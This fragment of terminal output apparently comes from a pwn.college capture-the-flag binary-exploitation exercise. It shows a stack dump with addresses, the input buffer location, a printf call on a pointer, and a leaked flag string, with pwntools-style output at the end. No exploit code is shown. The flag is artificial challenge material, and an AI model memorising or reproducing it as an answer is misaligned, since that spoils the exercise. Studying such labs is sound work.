| 0x00007fff3881ef38 (rsp+0x0088) | 60 90 b0 05 eb 60 00 00 | 0x000060eb05b09060 |
| 0x00007fff3881ef40 (rsp+0x0090) | a0 61 b0 05 eb 60 00 00 | 0x000060eb05b061a0 |
| 0x00007fff3881ef48 (rsp+0x0098) | 00 6a 41 67 8a 54 dd 39 | 0x39dd548a67416a00 |
| 0x00007fff3881ef50 (rsp+0x00a0) | 90 ff 81 38 ff 7f 00 00 | 0x00007fff3881ff90 |
| 0x00007fff3881ef58 (rsp+0x00a8) | d7 6b b0 05 eb 60 00 00 | 0x000060eb05b06bd7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff3881eef0

Calling printf() to printf with the pointer...
The string on the stack is: pwn.college{4ZdIy0Nf3F6-aPumXmZU4nCFOmO.QXygzN4EDL4ITM0EzW}

Goodbye!
[*] Got EOF while reading in interactive
$  
```